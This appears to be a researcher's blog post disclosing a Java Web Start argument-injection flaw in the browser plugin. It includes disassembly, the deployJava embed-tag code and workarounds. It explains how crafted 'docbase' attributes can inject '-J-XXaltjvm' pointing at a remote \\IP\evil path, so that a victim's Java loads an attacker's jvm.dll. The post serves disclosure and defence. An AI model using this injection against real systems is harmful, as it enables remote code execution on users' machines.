@@ -1,0 +1,126 @@
+Bye bye my little 0day :(, Tavis Ormandy did a great job uncovering a big logic flaw within Java JRE. I discovered that bug and other that affects every browser few weeks ago and I posted the common "0day++" tweet.
+
+The method in which Java Web Start support has been added to the JRE is not less than a deliberately embedded backdoor(I really don't think so) or a flagrant case of extreme negligence (+1). Let's see:
+
+Java Plugin for Browsers (Chrome,Firefox...) - Windows: npjp2.dll (The same for IE8's jp2iexp.dll)
+
+.text:6DAA3D96
+.text:6DAA3D96 ; =============== S U B R O U T I N E =======================================
+.text:6DAA3D96
+.text:6DAA3D96 ; Attributes: bp-based frame
+.text:6DAA3D96
+.text:6DAA3D96 sub_6DAA3D96    proc near               ; CODE XREF: sub_6DAA2ACB+170p
+.text:6DAA3D96
+.text:6DAA3D96 Data            = byte ptr -264h
+.text:6DAA3D96 var_263         = byte ptr -263h
+.text:6DAA3D96 ApplicationName = byte ptr -160h
+.text:6DAA3D96 StartupInfo     = _STARTUPINFOA ptr -5Ch
+.text:6DAA3D96 ProcessInformation= _PROCESS_INFORMATION ptr -18h
+.text:6DAA3D96 cbData          = dword ptr -8
+.text:6DAA3D96 hKey            = dword ptr -4
+.text:6DAA3D96 arg_0           = dword ptr  8
+.text:6DAA3D96 arg_4           = dword ptr  0Ch
+.text:6DAA3D96
+.text:6DAA3D96                 push    ebp
+.text:6DAA3D97                 mov     ebp, esp
+.text:6DAA3D99                 sub     esp, 264h
+.text:6DAA3D9F                 push    edi
+.text:6DAA3DA0                 lea     eax, [ebp+hKey]
+.text:6DAA3DA3                 push    eax             ; phkResult
+.text:6DAA3DA4                 push    20019h          ; samDesired
+.text:6DAA3DA9                 xor     edi, edi
+.text:6DAA3DAB                 push    edi             ; ulOptions
+.text:6DAA3DAC                 push    offset SubKey   ; "JNLPFile\\Shell\\Open\\Command"
+.text:6DAA3DB1                 push    80000000h       ; hKey
+.text:6DAA3DB6                 mov     [ebp+cbData], 104h
+.text:6DAA3DBD                 call    ds:RegOpenKeyExA
+.text:6DAA3DC3                 test    eax, eax
+.text:6DAA3DC5                 jz      short loc_6DAA3DCE
+.text:6DAA3DC7                 xor     eax, eax
+.text:6DAA3DC9                 jmp     loc_6DAA3F16
+
+
+
+The default handler is "javaws.exe",continuing...
+
+.text:6DAA3EB7                 push    [ebp+arg_4]
+.text:6DAA3EBA                 push    eax
+.text:6DAA3EBB                 push    offset aSDocbaseSS ; "\"%s\" -docbase %s %s"
+.text:6DAA3EC0                 push    esi             ; LPSTR
+.text:6DAA3EC1                 call    ebx ; wsprintfA
+.text:6DAA3EC3                 add     esp, 14h
+.text:6DAA3EC6                 jmp     short loc_6DAA3ED4
+.text:6DAA3EC8 ; ---------------------------------------------------------------------------
+.text:6DAA3EC8
+.text:6DAA3EC8 loc_6DAA3EC8:                           ; CODE XREF: sub_6DAA3D96+11Fj
+.text:6DAA3EC8                 push    eax
+.text:6DAA3EC9                 push    offset aSS_0    ; "\"%s\" %s"
+.text:6DAA3ECE                 push    esi             ; LPSTR
+.text:6DAA3ECF                 call    ebx ; wsprintfA
+.text:6DAA3ED1                 add     esp, 10h
+.text:6DAA3ED4
+.text:6DAA3ED4 loc_6DAA3ED4:                           ; CODE XREF: sub_6DAA3D96+130j
+.text:6DAA3ED4                 push    11h
+.text:6DAA3ED6                 pop     ecx
+.text:6DAA3ED7                 xor     eax, eax
+.text:6DAA3ED9                 lea     edi, [ebp+StartupInfo]
+.text:6DAA3EDC                 rep stosd
+.text:6DAA3EDE                 lea     eax, [ebp+ProcessInformation]
+.text:6DAA3EE1                 push    eax             ; lpProcessInformation
+.text:6DAA3EE2                 xor     ebx, ebx
+.text:6DAA3EE4                 lea     eax, [ebp+StartupInfo]
+.text:6DAA3EE7                 push    eax             ; lpStartupInfo
+.text:6DAA3EE8                 push    ebx             ; lpCurrentDirectory
+.text:6DAA3EE9                 push    ebx             ; lpEnvironment
+.text:6DAA3EEA                 push    ebx             ; dwCreationFlags
+.text:6DAA3EEB                 push    ebx             ; bInheritHandles
+.text:6DAA3EEC                 push    ebx             ; lpThreadAttributes
+.text:6DAA3EED                 push    ebx             ; lpProcessAttributes
+.text:6DAA3EEE                 push    esi             ; lpCommandLine
+.text:6DAA3EEF                 lea     eax, [ebp+ApplicationName]
+.text:6DAA3EF5                 push    eax             ; lpApplicationName
+.text:6DAA3EF6                 mov     [ebp+StartupInfo.cb], 44h
+.text:6DAA3EFD                 call    ds:CreateProcessA
+
+
+
+So basically the Java-Plugin Browser is running "javaws.exe" without validating command-line parameters. These parameters can be controlled by attackers via specially crafted embed html tags within a webpage.
+
+Let's see JavaDeploy.txt:
+
+ if (browser == 'MSIE') {
+
+            document.write('<' + 
+                'object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" ' +
+		'width="0" height="0">' +
+		'<' + 'PARAM name="launchjnlp" value="' + jnlp + '"' + '>' +
+	        '<' + 'PARAM name="docbase" value="' + jnlpDocbase + '"' + '>' +
+                '<' + '/' + 'object' + '>');
+        } else if (browser == 'Netscape Family') {
+
+            document.write('<' +
+		'embed type="application/x-java-applet;jpi-version=' +
+		deployJava.firefoxJavaVersion + '" ' +
+                'width="0" height="0" ' +
+                'launchjnlp="' +  jnlp + '"' +
+                'docbase="' +  jnlpDocbase + '"' +
+                ' />');
+        }
+
+
+That's it. This is how JAVA Plugin identifies Java Web Start content (jnlp files).So We can inject command-line parameters through "docbase" tag and even "launchjnlp".
+
+What type of arguments can we abuse to compromise a system?
+java.exe and javaw.exe support an undocumented-hidden command-line parameter "-XXaltjvm" and curiosly also "-J-XXaltjvm" (see -J switch in javaws.exe). This instructs Java to load an alternative JavaVM library (jvm.dll or libjvm.so) from the desired path. Game over. We can set -XXaltjvm=\\IP\evil , in this way javaw.exe will load our evil jvm.dll. Bye bye ASLR, DEP...
+
+Linux
+
+Same logic error, check this function "_Z10launchJNLPPKcS0" in libnpjp2.so
+
+MACOSX
+
+Not vulnerable.
+
+Workaround
+
+Disable javaws/javaws.exe in linux and Windows by any mean. Disable Deployment Toolkit to avoid unwanted installation as stated in Tavis' advisory. 
